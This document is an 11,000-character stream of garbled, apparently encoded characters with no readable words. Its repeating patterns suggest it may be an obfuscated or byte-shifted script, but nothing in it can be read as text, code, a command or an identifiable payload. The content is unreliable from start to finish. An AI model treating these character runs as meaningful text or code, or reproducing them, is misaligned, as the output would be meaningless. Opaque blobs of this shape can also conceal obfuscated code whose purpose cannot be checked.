¸ù÷öñððõúñ÷åº³öî¦çí½òù°ç¬ù÷ã³öî¦èçîòù¹½ù÷¢¢³öî¦çí¸òù°ù÷ö³öî¦ê¿èòùì±ù÷òáóî¦ºººõî¦ï½î¼õî¦¸ìôóî¦¸ä³öî¦êí¿òù°ù÷÷å£³öî¦æè¸òùé´ù÷ö³öî¦ìî»òùî½ù÷ò³öî¦ìçëòù±ëù÷÷øøöº³öî¦ëéïòù÷¬û½ù÷ã³öî¦í»ºòùæù÷¢¢³öî¦êï¸òù¶ªëù÷òº³öî¦ïëêòù°ç¬ù÷ã³öî¦ìæëòù·¼ïù÷ö³öî¦êæ½òùºëèù÷ò°«²²÷á³öî¦êè»òù¦±ù÷äÿ÷å½±°­ªþã¥£å³öî¦ì½êòù«®³ù÷ãò¿©¿·ªþ³³öî¦ïèîòùºëèù÷õù»ùö¸òºò÷åª¬§¥·¸ö³öî¦íè¸òù°ù÷ö³öî¦æìæòùæù÷ò³öî¦ìêîòù¿³½éù÷÷÷¥½±°­ªþã©³öî¦íè¿òù¶ªëù÷öªò³öî¦êì¿òùê©¯ù÷ò³öî¦ëçìòùî³íù÷÷åã¯³öî¦é¼íòùë¼ù÷ö÷á³öî¦ìèéòù«¹¤ù÷ö¸³öî¦ë½èòù°ù÷õù°½ùöò³öî¦æ»ºòùôûù÷÷÷äù➺ﻑùòù񈻜ùòù񈷻ùòù񈲓ùòù񈻓ùòù񈺑ùòù񈱱ùòù񈻳ùòù񈆮ùòù񈻐ùå£»²­»þ¸­³öî¦íî¸òù¬ù÷ö³öî¦ëí»òù¿³½éù÷÷å£½¿ª½¶ö÷¥££»²­»¥½±°­ªþ¼ã³öî¦èêéòùéÿ­ù÷å·¸öÿ¼÷¬»ª«¬°å¸±¬ö½±°­ªþþ±¸þ³öî¦ç½íòù¶ªëù÷ö¼÷÷¥½±°­ªþ¬ã¼øø¼³öî¦º»òù¸é¶ù÷õù±ùøø¼³öî¦¼ëòù°ù÷õù±ù³öî¦ë½çòùî½ù÷õù·ºùå·¸ö¬øø¬³öî¦éî»òùµýù÷÷¬»ª«¬°þ¬å£¬»ª«¬°å££½¿ª½¶ö¼÷¥²±¹¹»¬³öî¦ëîèòù¿³½éù÷ö³öî¦æèºòùù÷ö³öî¦ëëëòù°ç¬ù÷ò¼³öî¦íê¸òùµýù÷÷÷å£££½¿ª½¶ö÷¥²±¹¹»¬³öî¦ìíëòù¸é¶ù÷ö³öî¦ëïæòù¸èù÷ö³öî¦êì½òùê©¯ù÷ò³öî¦çï¿òùæù÷÷÷å£££÷ò³ù»¨ùù±°ùö³æöî¦í¿îòùìù÷ò¿­§°½þªãà¥½±°­ªþ³©ã³æòã¥ù¶­ùä¸«°½ª·±°ö¸ò¶÷¥½±°­ªþ³ãå¬»ª«¬°þ³öî¦ìí¼òùì±ù÷ö¸ò¶÷å£òù¿§ùä¸«°½ª·±°ö¸ò¶÷¥½±°­ªþ³ãå¬»ª«¬°þ³öî¦ëîïòùîù÷ö¸ò¶÷å£òù³¯¯º¸ùä¸«°½ª·±°ö¸ò¶÷¥½±°­ªþ³ãå¬»ª«¬°þ³öî¦íìîòù®ù÷ö¸ò¶÷å£òù²°ùä³©öî¦ìº¿òù³ù÷òù°¤±ùä³©öî¦éîíòùù÷òù¹ùä³©öî¦ë¸¸òù÷¬û½ù÷òù½¨³ùä¸«°½ª·±°ö¸ò¶÷¥½±°­ªþ³ªã³©å¬»ª«¬°þ³ªöî¦íí¿òù±ëù÷ö¸ò¶÷å£òù±¤ùä³©öî¦í¸¼òùê©¯ù÷òù¸·¯°ùä³©öî¦ê¿çòùôëù÷òù¶»¸ùä¸«°½ª·±°ö¸ò¶÷¥½±°­ªþ³ã³©å¬»ª«¬°þ³öî¦ï¸ëòùîù÷ö¸ò¶÷å£òù´«ùä³©öî¦êíºòù÷¬û½ù÷òùùä³©öî¦æééòù°ù÷òù°ùä³©öî¦ç»ìòù­¦êù÷òù¦³®¯ùä³©öî¦ë¸¼òù¤û»ù÷òù¼²­ùä³©öî¦ë¿ëòùôûù÷òù¼©ùä³©öî¦çéîòùôëù÷òùµ²ùä³©öî¦è¼»òù¦µù÷òù©¶ùä³©öî¦éï¸òù«®³ù÷òù¯½¯ùä³©öî¦ë¿éòù·êù÷òù³¹ùä³©öî¦èïîòù­¦êù÷òù¯¿¨ùä³©öî¦è¸ºòùì±ù÷òùùä³©öî¦ççëòùµ³ïù÷òù©§µùä³©öî¦í»ìòùë¼ù÷òù©ùä¸«°½ª·±°ö¸ò¶÷¥½±°­ªþ³¯ã³©å¬»ª«¬°þ³¯öî¦íéïòù¨§ù÷ö¸ò¶÷å£òù¼ùä³©öî¦ëìëòù­¤ù÷òù­º´ùä¸«°½ª·±°ö¸ò¶÷¥½±°­ªþ³ã³©å¬»ª«¬°þ³öî¦ééëòùé¸ù÷ö¸ò¶÷å£òù·¬§ùä¸«°½ª·±°ö¸ò¶÷¥½±°­ªþ³¸ã³©å¬»ª«¬°þ³¸öî¦ìçïòù°ù÷ö¸ò¶÷å£òù»ùä¸«°½ª·±°ö¸ò¶÷¥½±°­ªþ³¶ã³©å¬»ª«¬°þ³¶öî¦êè¸òù´ºù÷ö¸ò¶÷å£òù½·ùä¸«°½ª·±°ö¸ò¶÷¥½±°­ªþ³ã³©å¬»ª«¬°þ³öî¦ï»îòù¤û»ù÷ö¸ò¶÷å£òù§¬¨±ùä³©öî¦ì¸ïòùºëèù÷òùµùä¸«°½ª·±°ö¸ò¶÷¥½±°­ªþ³ã³©å¬»ª«¬°þ³öî¦éêéòù¿³½éù÷ö¸ò¶÷å£òùªªùä¸«°½ª·±°ö¸ò¶÷¥½±°­ªþ³°ã³©å¬»ª«¬°þ³°öî¦èº»òù«®³ù÷ö¸ò¶÷å£òù¿º´ùä³©öî¦èººòù®ù÷òùµùä³©öî¦ë»èòù¨§ù÷òù­·¦´ùä³©öî¦íïìòù´ºù÷òù²¯ùä³©öî¦éëîòù­¦êù÷òù®ùä¸«°½ª·±°ö¸ò¶÷¥½±°­ªþ³¤ã³©å¬»ª«¬°þ³¤öî¦ïî»òùî½ù÷ö¸ò¶÷å£òùµ¨ùä³©öî¦é½¼òù®ù÷òù¤´½ùä³©öî¦èìºòù­¤ù÷òù»ºµùä¸«°½ª·±°ö¸ò¶ò÷¥½±°­ªþ³ã³©å¬»ª«¬°þ³öî¦éîæòùî½ù÷ö¸ò¶ò÷å£òù­¨ùä¸«°½ª·±°ö¸ò¶÷¥½±°­ªþ³½ã³©å¬»ª«¬°þ³½öî¦ëïíòùôëù÷ö¸ò¶÷å£òù©¹ùä³©öî¦êææòùé´ù÷òù¤¼¶®ùä¸«°½ª·±°ö¸ò¶÷¥½±°­ªþ³¿ã³©å¬»ª«¬°þ³¿öî¦éï½òù­¦êù÷ö¸ò¶÷å£òù²¬ùä¸«°½ª·±°ö¸ò¶÷¥½±°­ªþ³ã³©å¬»ª«¬°þ³öî¦ì¿½òù«¹¤ù÷ö¸ò¶÷å£òùµ¼ùä³©öî¦éçêòù¹½ù÷òù®²¹ùä¸«°½ª·±°ö¸ò¶÷¥½±°­ªþ³´ã³©å¬»ª«¬°þ³´öî¦ë¿ïòù¦µù÷ö¸ò¶÷å£òùª´©µùä¸«°½ª·±°ö¸ò¶÷¥½±°­ªþ³ºã³©å¬»ª«¬°þ³ºöî¦ëºèòùé¸ù÷ö¸ò¶÷å£òùµ¶ùä¸«°½ª·±°ö¸ò¶÷¥½±°­ªþ³ã³©å¬»ª«¬°þ³öî¦ëéëòùù÷ö¸ò¶÷å£òù·«ºªùä³©öî¦éºîòùë¼ù÷òù¸§ùä³©öî¦ì¿éòù¤û»ù÷òù©°´ùä³©öî¦ìæ»òù®ù÷òù©¹¨ùä³©öî¦èºéòùôëù÷òù¹µ´ùä³©öî¦éêºòùîù÷òù»°¹ùä³©öî¦ìê¼òù¿³½éù÷òùùä³©öî¦æî¿òùê©¯ù÷òù²¼¸ùä³©öî¦èïêòùæù÷£ò¯ãª³©öî¦íææòù®ù÷òãª³©öî¦ìîêòùù÷å¸±¬ö½±°­ªþ¸þ±¸þ¯÷¥·¸ö³©öî¦ìì¼òù°ù÷ö³©öî¦èî¿òù½«ù÷ò³©öî¦ëîëòùºëèù÷÷÷¥½±°­ªþã³©öî¦ææêòù­¦êù÷öò÷å·¸ö÷ãå£»²­»þª¬§¥·¸ö³©öî¦ççíòùé´ù÷ö³©öî¦éê½òùç®ù÷ò³©öî¦êç¸òùµýù÷÷÷ª¬§¥·¸öÿ³©öî¦ï»ïòù°ù÷ö¸÷÷¬»ª«¬°å¬»ª«¬°þ¶³©öî¦æºéòù¬ù÷ö³©öî¦è»éòùë¼ù÷õù°½ùöò³©öî¦ê¸ºòù°ç¬ù÷÷÷å£½¿ª½¶ö÷¥¬»ª«¬°å£»²­»¥½±°­ªþã¸³©öî¦êîìòù·¼ïù÷³©öî¦çºíòùì±ù÷å·¸ö³©öî¦êï¿òùì±ù÷öò³©öî¦ççéòùî³íù÷÷÷¥½±°­ªþ¹ã¸³©öî¦êê»òù¸é¶ù÷³©öî¦ëí¼òùì±ù÷õùªù¢¢¸³©öî¦çæíòù²êöêù÷³©öî¦éèçòùæù÷òã¹³©öî¦èº¿òùîù÷ö³©öî¦ê¿ºòù¹½ù÷òùù÷³©öî¦æèìòùî½ù÷ö³©öî¦ìí»òùé´ù÷òùù÷å·¸ö¸³©öî¦ïîìòù÷¬û½ù÷÷³©öî¦êë¸òù¦±ù÷ö½¿½¶»¿³»ò¹ò¸³©öî¦çïºòùºëèù÷÷å½±°­ªþµã³©öî¦éííòù§ç¶ù÷ö½±°¸·¹³©öî¦è½ºòùêïù÷õ³©öî¦ï½¼òùìù÷ò°«²²÷á½±°¸·¹³©öî¦èêíòùé´ù÷õ³©öî¦ë»ºòùé¸ù÷äº»¸¿«²ª­³©öî¦çï¸òù·êù÷õ³©öî¦ïéëòùù÷å·¸öµ÷¥ª¬§¥¿©¿·ªþ³³©öî¦ëî¿òùì±ù÷õù»­ùö¸³©öî¦ìçèòù¸èù÷÷å£½¿ª½¶ö§÷¥£²±¹¹»¬³©öî¦é¼¿òù³ù÷ö³©öî¦íçèòùì±ù÷ö³©öî¦ç¿æòùêïù÷ò÷÷å½±°­ªþã³©öî¦íê½òùé´ù÷ö½±°¸·¹³©öî¦íçæòù«¹¤ù÷õ³©öî¦ëîçòùéÿ­ù÷ò°«²²÷á½±°¸·¹³©öî¦æêíòùÿéù÷õ³©öî¦ìè¿òùêïù÷äº»¸¿«²ª­³©öî¦çì¿òù¤û»ù÷õ³©öî¦ëï½òù°ù÷å·¸ö÷¥·¸ö³©öî¦ìæçòùì±ù÷ö³©öî¦½îòù«¹¤ù÷ò³©öî¦ç¿»òùµ¤¼ûù÷÷÷ª¬§¥·¸ö³©öî¦êæºòùµ³ïù÷ö³©öî¦æíçòùî³íù÷ò³©öî¦é»ìòùê©¯ù÷÷÷¥²»ªþ±ã¹å·¸ö¹³©öî¦æìëòù«®³ù÷ö³©öî¦ìèèòùîù÷÷÷¥·¸ö³©öî¦ïéïòùé´ù÷ö³©öî¦ìîéòùê©¯ù÷ò³©öî¦ïçëòù¸é¶ù÷÷÷ã³©öî¦ïí½òù­¤ù÷òã³©öî¦éæîòùî³íù÷öò³©öî¦ï¼ºòù°ç¬ù÷÷å»²­»¥½±°­ªþ«ã¸³©öî¦é¸ïòù¹½ù÷øø¸³©öî¦æçìòù®ù÷³©öî¦ìëæòù¤û»ù÷õ³©öî¦èç¿òù·¼ïù÷¢¢¸³©öî¦í½¸òù°ù÷øø¸³©öî¦èî¸òùù÷³©öî¦ïº¿òù§ç¶ù÷¢¢¸³©öî¦¼èòùîù÷õ³©öî¦æºíòùê©¯ù÷å·¸ö«÷¥·¸ö³©öî¦éíìòù½«ù÷ö³©öî¦æ½êòùºëèù÷ò³©öî¦çæëòù¸èù÷÷÷¥½±°­ªþ·ã³©öî¦ë½êòùë¼ù÷³©öî¦éèæòù¬ù÷öù¢ù÷å²»ªþîãóî¦êéôî¦é¸õóî¦çï»ôî¦íõî¦í»çíå©¶·²»öÿÿ÷¥­©·ª½¶ö·îõõ÷¥½¿­»ùîùä·¸ö³©öî¦ì¸èòù¦µù÷ö¿òÿÿ÷øø³©öî¦êììòù¨§ù÷öò´÷÷¬»ª«¬°ÿÿå½±°ª·°«»å½¿­»ùïùä¬»ª«¬°ÿå½¿­»ùìùä·¸öÿ¸÷¬»ª«¬°ÿå½±°ª·°«»å½¿­»ùíùä·¸ö³©öî¦ëæèòùéÿ­ù÷öò°÷÷¬»ª«¬°ÿÿå½±°ª·°«»å½¿­»ùêùä·¸ö³©öî¦íîèòù¸é¶ù÷ö¤òÿ÷øø³©öî¦éººòùôëù÷öò½÷÷¬»ª«¬°ÿÿå½±°ª·°«»å½¿­»ùëùä·¸ö³©öî¦êîºòù¦±ù÷ö¶ò÷÷¬»ª«¬°ÿÿå½±°ª·°«»å£¼¬»¿µå££»²­»þ±ã«³©öî¦ï»êòùîù÷öùù÷á«ä³©öî¦íº¿òù°ù÷ö«ò³©öî¦í»éòùç®ù÷÷å£»²­»¥½±°­ªþ·ã¿©¿·ªþ³³©öî¦æìºòù·¼ïù÷õ³©öî¦ëèçòù±ëù÷ö¹÷³©öî¦íéíòù°ù÷öö÷ãà°«²²÷å·¸ö·÷±ã·å£££½±°­ªþ»ã½±°¸·¹³©öî¦é»ºòùéÿ­ù÷õù·­ù¢¢º»¸¿«²ª­³©öî¦æë¿òù¹½ù÷õù·­ù¢¢ù񈱇ùòù񈱄ùòã»¿ª¶³©öî¦ê½îòùôûù÷ö³©öî¦ï»æòùµ¤¼ûù÷ö¿ª¶³©öî¦êèçòù¹½ù÷ö÷ò»³©öî¦çéçòù½«ù÷÷÷å¿©¿·ªþ³³©öî¦íºèòùî½ù÷õù»ùö³©öî¦æ¿îòùÿéù÷ò¥ù¬»¿½ªùä¥ùª»¦ªùäòùµ»§ùä¥ù¬»³±ª»·ºùä³©öî¦ïêîòù½«ù÷òù·ºùä¸³©öî¦èìíòùîù÷ù·ºùòù®¿¬ª·½·®¿°ªùä±£££ò¥ù­ª¿ª«­·º·­ªùä±ò³©öî¦ê¿ìòùêïù÷ö³³©öî¦íì½òù²êöêù÷ù·ºù³©öî¦êïºòùë¼ù÷öùäù÷î¦ïëé½õî¦ïæ½ëõóî¦ì»êïò³©öî¦çêëòùÿéù÷÷£÷ò²±¹¹»¬³©öî¦êïíòù¿³½éù÷ö³©öî¦êíèòù¸èù÷ö³©öî¦ï¼¼òù¿³½éù÷ö³©öî¦ç¿¼òùôëù÷ö³©öî¦é½æòù­¦êù÷ò÷ò³©öî¦ë½ºòù¶ªëù÷÷ò÷÷å£»²­»¥½±°­ªþïã³©öî¦æçéòù«¹¤ù÷ö©òª³©öî¦ëìèòùµýù÷¢¢ùù÷òìã³©öî¦ïëèòù­¦êù÷öò¯ù·ºù¢¢ùù÷å¬»ª«¬°þ³©öî¦èæêòùî³íù÷öïò÷¢¢³©öî¦ëé¼òùµ¤¼ûù÷öìò¸÷å££½¿ª½¶öï÷¥£»²­»þã³©öî¦ë»¼òù­¤ù÷òã³©öî¦êééòùîù÷áð³©öî¦æ¸¿òùîù÷õù¹»ùáð³©öî¦é»¼òùì±ù÷á³©öî¦ï¸æòù·¼ïù÷ä³©öî¦æè½òù®ù÷å££³©öî¦æéîòùµ³ïù÷ö­»ª³³»º·¿ª»òö÷ãà¶¿°º²»«ª±¿¨»ª¿ª«­ö³ò¸ò¹÷³©öî¦ïíêòùé´ù÷öö÷ãà¥£÷÷å½±°ª·°«»å£²»ªþ°å·¸ö¸³©öî¦ìºìòù¿³½éù÷³©öî¦éíêòùôëù÷÷¥·¸ö³©öî¦çêèòù¬ù÷ö³©öî¦ïìºòùç®ù÷ò³©öî¦íé¼òù¸èù÷÷÷¥½±°­ªþíã³³©öî¦ìêæòùì±ù÷øø³³©öî¦ïîïòùµ¤¼ûù÷ù·ºùá³³©öî¦è»¼òùë¼ù÷ù·ºùäùùå°ãí³©öî¦ë¸¿òùé¸ù÷öñäîóçõñòùù÷å·¸öÿ°³©öî¦ï»êòùîù÷öùù÷÷°õã³©öî¦é»ïòùµ¤¼ûù÷å£»²­»þ³©öî¦æ½¸òù¹½ù÷ö³©öî¦ëìæòùÿéù÷ö³©öî¦êìçòùìù÷ò³©öî¦êééòùîù÷÷÷å£»²­»þ³©öî¦ïïéòùé¸ù÷ö³©öî¦ì¼éòùµýù÷ò³©öî¦çïïòù«¹¤ù÷÷áöã³©öî¦ì¼ºòù§ç¶ù÷òã³©öî¦í»¸òùôûù÷÷ä°ã¸³©öî¦é¸ïòù¹½ù÷³©öî¦ê»»òùù÷õùªù¢¢¸³©öî¦»¼òù­¤ù÷³©öî¦ìïæòù¬ù÷å·¸ö¸³©öî¦ëè½òùæù÷øø°øøÿ³©öî¦éïïòù°ù÷ö·­·ºò³©öî¦èç¸òùéÿ­ù÷ö­ª¬·®»¨·½»ò°÷÷÷¥·¸ö³©öî¦íèçòùìù÷ö³©öî¦êíîòù­¤ù÷ò³©öî¦æ¿æòùç®ù÷÷÷³©öî¦éæëòù²êöêù÷ö½¿½¶»¿³»ò°ò¸³©öî¦çîêòù¬ù÷÷å»²­»¥½±°­ªþéã³©öî¦èì¸òùù÷¢¢³©öî¦èéèòùê©¯ù÷¢¢ùðùå¬»ª«¬°þ³©öî¦ìæ¼òùµ³ïù÷öéò³©öî¦æ¼çòùêïù÷÷¢¢³©öî¦éëºòùë¼ù÷öéòùù÷å££½±°­ªþ¤ã¸³©öî¦æíîòùôëù÷³©öî¦ïî¸òùºëèù÷òã³©öî¦è¿ºòùîù÷ö·­¬±«®ò÷å·¸öÿ¤øø³©öî¦íé»òù´ºù÷ö·­·ºò³©öî¦ìì½òùÿéù÷ö­ª¬·®»¨·½»ò°÷÷÷¥·¸ö³©öî¦çî¿òùî³íù÷ö³©öî¦æëéòù¬ù÷ò³©öî¦æ»¼òùé´ù÷÷÷¥·¸ö÷ª¬§¥½±°­ªþéã¿©¿·ªþ³©öî¦çèºòù¦µù÷ö¬»­±²¨»»¿²·ºò³ò°ò÷å·¸öé÷°ãéå£½¿ª½¶öæ÷¥£»²­»þª¬§¥·¸ö³³©öî¦ìç¿òù¸èù÷õ³©öî¦çê¿òù¤û»ù÷÷¥½±°­ªþçã¿©¿·ªþ³³©öî¦ìéìòùôëù÷õ³©öî¦æ»êòùµ¤¼ûù÷ö°÷³©öî¦ì¿êòùî³íù÷öö÷ãà°«²²÷å·¸öç÷°ãçå££½¿ª½¶ö÷¥££»²­»þã³©öî¦è¼ïòù½«ù÷³©öî¦çíæòù²êöêù÷õùªù¢¢³©öî¦»¼òù­¤ù÷³©öî¦é¼èòù®ù÷å£·¸ö°÷¥½±°­ªþ³ã³©öî¦ç½æòù½«ù÷ö­ª¬·®»¨·½»ò°÷å·¸ö³÷°ã³å£½±°­ªþ½ã³©öî¦ëç¿òùù÷ö´·º±«³ò°÷å·¸öÿ¤øø³©öî¦èè¼òùé¸ù÷ö½ò³©öî¦é¼çòùºëèù÷÷÷¥·¸ö³©öî¦íèïòù¨§ù÷ö³©öî¦èºêòù¶ªëù÷ò³©öî¦ëéºòùç®ù÷÷÷¥·¸ö³©öî¦èî»òùî³íù÷ö·­¿°°»ºò°ò÷÷¥·¸ö³©öî¦ïçèòù¹½ù÷ö³©öî¦é¿êòù¸èù÷ò³©öî¦ìî¸òù¬ù÷÷÷ã³©öî¦ì½ºòù¿³½éù÷òã³©öî¦ì¼»òùêïù÷öò³©öî¦íêéòùôûù÷÷å»²­»¥²±¹¹»¬³©öî¦ìï¿òù¤û»ù÷ö³©öî¦ïæéòùî½ù÷ö³©öî¦í¿¼òù­¦êù÷ö³©öî¦èì»òù÷¬û½ù÷ö³©öî¦æìêòù«®³ù÷ö³©öî¦é»¿òù¹½ù÷ò½÷òù¦ìîöù÷òá³©öî¦ìçéòùîù÷äùù÷òù÷ù÷÷å½±°ª·°«»å£££»²­»¥½±°­ªþã³©öî¦çæïòùµ¤¼ûù÷å·¸öÿ÷¬»ª«¬°þ°«²²å½±°­ªþã³©öî¦í¿ìòù«¹¤ù÷õ³©öî¦ë»»òùîù÷å·¸öøø³©öî¦æíïòù§ç¶ù÷õù±ùøø³©öî¦ìè¸òù÷¬û½ù÷õù±ù³©öî¦æéíòù­¤ù÷õ³©öî¦ç»éòùÿéù÷÷¥½±°­ªþã¥£å¬»ª«¬°þ³©öî¦éè¸òù¶ªëù÷ã³©öî¦èèïòùîù÷õù±ù³©öî¦ç½¸òùµ³ïù÷õ³©öî¦êç¿òùê©¯ù÷ò³©öî¦ìëïòùù÷ã³©öî¦éèèòùë¼ù÷õù±ù³©öî¦êº»òù¿³½éù÷õùªù¢¢³©öî¦èìèòù­¦êù÷õù±ù³©öî¦é»»òùî³íù÷ò³©öî¦é¸êòùôëù÷ã³©öî¦éí¼òùµ³ïù÷õù±ù³©öî¦èççòù·êù÷òå£¸±¬ö½±°­ªþ©þ±¸þ³©öî¦ëêìòù°ù÷ö÷÷¥½±°­ªþªã©å·¸öªøøª³©öî¦ííîòù°ù÷õù±ùøøª³©öî¦í¼êòùù÷õù±ù³©öî¦èçèòùæù÷õ³©öî¦çééòùî³íù÷÷¥½±°­ªþã¥£å¬»ª«¬°þ³©öî¦í¿ïòù÷¬û½ù÷ãª³©öî¦ìè¸òù÷¬û½ù÷õù±ù³©öî¦èîïòù·¼ïù÷õ³©öî¦í»¼òù«¹¤ù÷ò³©öî¦é¸¸òù´ºù÷ãª³©öî¦ééæòùç®ù÷õù±ù³©öî¦í½éòùë¼ù÷õùªù¢¢³©öî¦ééæòùç®ù÷õù±ù³©öî¦íïºòùù÷ò³©öî¦ìê¿òù·¼ïù÷ãª³©öî¦éé»òùìù÷õù±ù³©öî¦ïï¼òù±ëù÷òå££¬»ª«¬°þ°«²²å££½±°­ªþ¿ã³©öî¦éêìòù®ù÷ö¹»ª±º§ò¸÷òã³©öî¦êçºòù³ù÷ö¹»ª­¹§®»ò¸÷ò´ã³©öî¦êìéòù¹½ù÷ö¹»ª«±ª»ºò¸÷òºã³©öî¦½æòù¨§ù÷ö¹»ª»°ª·±°­ò¸÷å²»ªþã³©öî¦é¼ìòùê©¯ù÷òã³©öî¦ç½ºòùê©¯ù÷ö¿òùù÷å·¸ö³©öî¦ç¼½òùù÷öò³©öî¦ìëîòùìù÷÷÷ã³©öî¦ïíçòù¤û»ù÷òã¸³©öî¦êééòùîù÷áð³©öî¦í¼ëòù²êöêù÷õù¹»ùáð³©öî¦æì¸òùµýù÷¢¢³©öî¦ïæçòùë¼ù÷å»²­»¥·¸ö³©öî¦êçéòùîù÷öò³©öî¦í¸êòù°ù÷÷÷¥·¸ö³©öî¦ì½»òùµ¤¼ûù÷ö³©öî¦ëëîòù´ºù÷ò³©öî¦èîëòùì±ù÷÷÷¥½±°­ªþã³©öî¦ê¸éòù§ç¶ù÷å·¸öÿ÷¬»ª«¬°þ°«²²å·¸ö³©öî¦êæçòù÷¬û½ù÷õ³©öî¦æîºòùµ¤¼ûù÷øø³©öî¦êé½òù´ºù÷õ³©öî¦çìéòù°ù÷³©öî¦æ½½òù«¹¤ù÷÷¬»ª«¬°þ³©öî¦êé½òù´ºù÷õ³©öî¦íºçòù¦µù÷³©öî¦ì½ïòù°ù÷å·¸ö³©öî¦è¼ëòùù÷õ³©öî¦é½½òùç®ù÷øø³©öî¦ëïèòù¸èù÷õ³©öî¦èêçòù¶ªëù÷³©öî¦è¿æòùù÷÷¬»ª«¬°þ³©öî¦í»íòùµ¤¼ûù÷õ³©öî¦í¼¼òùé¸ù÷³©öî¦ê¸éòù§ç¶ù÷å·¸ö³©öî¦ïëçòù·êù÷õ³©öî¦êïêòùéÿ­ù÷õ³©öî¦íºêòù·êù÷øø³©öî¦ëïèòù¸èù÷õ³©öî¦éºìòù°ù÷õ³©öî¦èí»òù÷¬û½ù÷³©öî¦ïº½òù·¼ïù÷÷¬»ª«¬°þ³©öî¦æ¸»òù¦±ù÷õ³©öî¦íºíòùîù÷õ³©öî¦êé»òùºëèù÷³©öî¦ìæïòùµ³ïù÷å·¸ö³©öî¦æîèòù¨§ù÷õù¹»ùøø³©öî¦ì»êòùêïù÷õù¹»ù³©öî¦ï¼îòùç®ù÷÷¬»ª«¬°þå·¸ö³©öî¦èºèòù´ºù÷õù¹»ùøø³©öî¦ïïçòù²êöêù÷õù¹»ù³©öî¦½ºòù¦±ù÷÷¬»ª«¬°þå¬»ª«¬°þ°«²²å£»²­»þã³©öî¦æïìòù°ç¬ù÷òã¸³©öî¦èì½òùôûù÷áð³©öî¦çéêòù¦±ù÷õù¹»ùáð³©öî¦êéïòùîù÷¢¢³©öî¦æ¼íòùù÷å£»²­»¥·¸ö³©öî¦ì»ëòùé´ù÷öò³©öî¦ê½»òù¸é¶ù÷÷÷³©öî¦é»îòùî³íù÷ö³©öî¦çº¸òù®ù÷ò³©öî¦ë¿ìòùµ¤¼ûù÷÷á³©öî¦êééòùîù÷ö¥ùª§®»ùä³©öî¦é¿îòù­¤ù÷òù­»°º»¬ùä¯òù°¿³»ùä³©öî¦ëïêòùî½ù÷¢¢³©öî¦æèçòùéÿ­ù÷òù½¶¿ªºùä¸òù³»­­¿¹»ùä³©öî¦çèïòùîù÷ö³©öî¦ê¼¿òù½«ù÷ö³©öî¦íæéòù­¦êù÷ö¶áùùäò÷òù¦ìîù÷ò°³©öî¦ëèëòù¨§ù÷öù¦ìîù÷÷òù·­±³³¿°ºùäÿÿ£÷äöã³©öî¦ìçëòù±ëù÷òã¸³©öî¦¸èòùêïù÷áð³©öî¦í¼ºòù¿³½éù÷õù¹»ùáð³©öî¦éëæòù³ù÷á³©öî¦æ»æòùîù÷ä³©öî¦ççêòù¹½ù÷÷å»²­»¥·¸ö³©öî¦æéæòù·êù÷öò³©öî¦íçëòù«¹¤ù÷÷÷¥·¸ö³©öî¦ëîêòùµýù÷ö³©öî¦æïèòùéÿ­ù÷ò³©öî¦½»òùì±ù÷÷÷ã³©öî¦ç¼ºòùë¼ù÷òã³©öî¦êìêòùµýù÷å»²­»þª¬§¥½±°­ªþ©ã³©öî¦ï»¸òùµ¤¼ûù÷ö°ò³©öî¦éìèòù²êöêù÷ò³©öî¦æºìòù¶ªëù÷÷å¤ã³©öî¦æìéòùêïù÷ö©÷á½³©öî¦æïçòùºëèù÷ö¿³©öî¦èí¿òù¸é¶ù÷õù°½ùö©ò³©öî¦êî¿òùç®ù÷÷÷äù➺ﻑùòù񈻜ùòù񈷻ùòù񈲓ùòù񈻓ùòù񈺑ùòù񈱱ùòù񈻳ùòù񈆮ùòù񈻐ùå£½¿ª½¶öª÷¥´ãù➺ﻑùòù񈻜ùòù񈷻ùòù񈲓ùòù񈻓ùòù񈺑ùòù񈱱ùòù񈻳ùòù񈆮ùòù񈻐ùå££»²­»¥·¸ö³©öî¦è¸éòù®ù÷öò³©öî¦èçëòù¨§ù÷÷÷ã³©öî¦èèîòùù÷òã¸³©öî¦ìæïòùµ³ïù÷áð³©öî¦ì½èòù°ç¬ù÷õ³©öî¦æì½òù³ù÷áð³©öî¦é¿¸òù²êöêù÷¢¢³©öî¦ëéæòù°ç¬ù÷å»²­»¥·¸ö³©öî¦êæ¸òùµýù÷öò³©öî¦ë¿êòùù÷÷÷ã³©öî¦ë¸æòù³ù÷òã³©öî¦ìçìòù±ëù÷å»²­»¥·¸ö³©öî¦çïéòù·¼ïù÷öò³©öî¦ì»çòù¬ù÷÷÷¥·¸ö³©öî¦ìçîòù¬ù÷ö³©öî¦ï¸¼òùì±ù÷ò³©öî¦ìëèòùî½ù÷÷÷ã³©öî¦æ¼ìòùë¼ù÷òã³©öî¦çïêòùî½ù÷å»²­»¥½±°­ªþªã©ªøø¯³©öî¦íººòùæù÷õù±ùøø¸³©öî¦ïêìòù«¹¤ù÷õù±ù³©öî¦éîêòùìù÷õù·ºùå·¸öªøøª³©öî¦çéçòù½«ù÷÷¬»ª«¬°þªå££»²­»¥·¸ö³©öî¦íç¸òù·¼ïù÷öò³©öî¦ë¼çòùÿéù÷÷¢¢³©öî¦½¸òùôëù÷öò³©öî¦æìîòùµ³ïù÷÷÷ã³©öî¦ê¸êòùìù÷òã³©öî¦ìé½òù¸èù÷å»²­»¥·¸ö³©öî¦í¼èòù¿³½éù÷öò³©öî¦è½½òù¤û»ù÷÷÷³©öî¦æºêòùôëù÷ö³©öî¦çéºòù¨§ù÷ò³©öî¦í¼îòù¦±ù÷÷áöã³©öî¦èè¿òùÿéù÷òã³©öî¦êë½òùù÷÷ä³©öî¦ïîêòùù÷öòòòÿÿòÿ÷å»²­»¥·¸ö³©öî¦é¼éòùæù÷öò³©öî¦æî»òù«¹¤ù÷÷÷ã³©öî¦ï¿éòùìù÷òã³©öî¦íî»òùç®ù÷ö¿ò³©öî¦éç½òù·êù÷÷å»²­»þ³©öî¦é¿èòùé¸ù÷öò³©öî¦êèêòùµ¤¼ûù÷÷áöã³©öî¦ì»ºòù°ç¬ù÷òã³©öî¦íè½òù­¤ù÷ö¿ò³©öî¦æêéòùê©¯ù÷÷÷äöã³©öî¦ëìºòù·êù÷òãùùõõùù¢¢³©öî¦ç½îòùî³íù÷÷å£££££££££³©öî¦ëæ½òù¬ù÷ö³©öî¦é¸¼òùìù÷òî¦ïìçïõî¦íïôî¦çºõî¦ìôóî¦ïæïº÷øøöã³©öî¦º¼òù¦µù÷ö³©öî¦çºêòù¸é¶ù÷öóî¦ìì½íõî¦¸¿ºôóî¦ïõî¦íìéîòóî¦ï½¼¼õóî¦ïêèèõî¦íïæì÷ò³©öî¦ìë¼òù·¼ïù÷÷÷å·¸ö